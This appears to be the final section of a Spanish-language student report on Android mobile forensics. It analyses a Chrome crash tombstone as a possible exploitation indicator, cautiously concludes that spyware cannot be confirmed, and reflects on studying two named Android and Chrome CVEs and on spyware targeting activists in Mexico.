El proceso com.android.chrome (PID 6944, arquitectura arm) terminó el 2026-04-18 17:16:58 con señal SIGSEGV (SEGV_MAPERR) por "null pointer dereference". Sabiendo que un tombstone es un archivo de volcado que el sistema genera automáticamente cada vez que un proceso nativo termina de forma anormal, me hace pensar en dos posibles causas: que algún proceso se haya ejecutado y por error en el sistema lo haya terminado, o que haya sido provocado por algún tipo de ejecución. 
Dado al contexto previo en el que he visto el comportamiento del dispositivo, observé que el tombstone señala el archivo de Chrome, lo cual me parece sospechoso que haya sido por algún fallo, por lo que no puede descartarse que el crash sea el resultado de un intento de explotación del navegador.

Varios elementos refuerzan esta hipótesis. El thread que recibió la señal fatal es el TID 7491, distinto al PID principal 6944, lo que indica que el crash ocurrió en un thread secundario — el tipo de thread donde Chrome ejecuta contenido web externo. El subtipo SEGV_MAPERR confirma que el acceso fue a una dirección completamente no mapeada, patrón compatible con la desreferencia de un puntero corrupto o nulo producto de una condición de memoria forzada. Adicionalmente, el proceso corría en arquitectura arm de 32 bits sobre un dispositivo arm64, lo que es técnicamente relevante porque los exploits de navegador suelen apuntar específicamente al proceso renderer en 32 bits, donde las protecciones de memoria son más débiles y el espacio de direcciones es más predecible.

```json
    {
        "file_name": "tombstone_01",
        "file_timestamp": "2026-04-18 17:16:58.000000",
        "build_fingerprint": "ZTE/ZTE_Blade_V10/P671F20:9/PPR1.180610.011/20210409.184845:user/release-keys",
        "revision": "0",
        "arch": "arm",
        "timestamp": "2026-04-18 17:16:58.000000",
        "process_uptime": null,
        "command_line": null,
        "pid": 6944,
        "tid": 7491,
        "process_name": "com.android.chrome",
        "binary_path": null,
        "selinux_label": null,
        "uid": -1,
        "signal_info": {
            "code": 1,
            "code_name": "SEGV_MAPERR",
            "name": "SIGSEGV",
            "number": 11
        },
        "cause": "null pointer dereference",
        "extra": null
    }
```
Dado este análisis, concluyo que el dispositivo cuenta con indicios de haber sido comprometido. Sin embargo, considero que la evidencia recopilada no es suficiente para determinar si el dispositivo contenía spyware o no. Evidentemente, existen señales anómalas relevantes, como la persistencia de ADB, la posible desactivación de mecanismos de verificación de paquetes y la presencia de eventos que sugieren manipulación del entorno de seguridad del dispositivo.

No obstante, estos elementos deben interpretarse como indicadores de riesgo y no como una confirmación definitiva de infección por spyware. Para llegar a una conclusión más sólida sería necesario contar con más evidencia, como análisis profundo de aplicaciones instaladas, revisión de conexiones de red, identificación de procesos sospechosos, correlación temporal de eventos y búsqueda de indicadores de compromiso específicos.

Por lo tanto, el hallazgo principal es que el dispositivo presenta condiciones compatibles con una posible manipulación o preparación para instalación de software no autorizado, pero no se puede afirmar de manera concluyente la presencia de spyware únicamente con la evidencia disponible.


---

## 6. Conclusión
El desarrollo de este proyecto me permitió comprender de manera práctica qué son ycómo funcionan las cadenas de explotación en dispositivos Android, así como las dificultades reales asociadas a su implementación y análisis. A través del estudio de CVE-2020-16040 y CVE-2021-0920 fue posible analizar el comportamiento de vulnerabilidades que afectan tanto al espacio de usuario como al kernel del sistema operativo, entendiendo cómo distintos componentes pueden encadenarse dentro de un escenario de ataque más complejo.

Adicionalmente, el proyecto permitió aplicar herramientas y metodologías de análisis forense sobre Android, interpretando artefactos como `logcat`, *tombstones* y configuraciones del sistema para identificar comportamientos anómalos y posibles indicadores de manipulación del dispositivo. Esto reforzó la relación entre la investigación ofensiva y el análisis defensivo, mostrando cómo el entendimiento técnico de las vulnerabilidades puede contribuir también a procesos de detección e investigación forense.

Por otra parte, el trabajo me permitió expandir mis conocimientos relacionados con Red teaming como explotación de memoria, y Blue Team en análisis de vulnerabilidades, funcionamiento interno de Android y análisis forense móvil, proporcionando una visión más amplia sobre los retos técnicos y metodológicos involucrados en el estudio de amenazas avanzadas sobre dispositivos móviles.

Finalmente, me quedo satisfecho con lo logrado y aprendido durante este proyecto. Comprender cómo tecnologías invasivas, como el spyware, pueden afectar a sectores activistas en México resulta preocupante, especialmente porque evidencia que aún existen riesgos graves para quienes buscan generar un cambio social. Este trabajo me permitió dimensionar que la seguridad digital no es únicamente un tema técnico, sino también humano y social. Ninguna persona debería enfrentar vigilancia, persecución o compromiso de sus dispositivos por ejercer actividades legítimas de defensa, denuncia o participación social.

---

## Referencias

Google Project Zero. (2020). *CVE-2020-16040 analysis: V8 type confusion in TurboFan*. Google Project Zero Blog. https://googleprojectzero.blogspot.com/

Google Project Zero. (2021). *CVE-2021-0920: Linux kernel unix_gc use-after-free*. Project Zero Issue Tracker. https://bugs.chromium.org/p/project-zero/

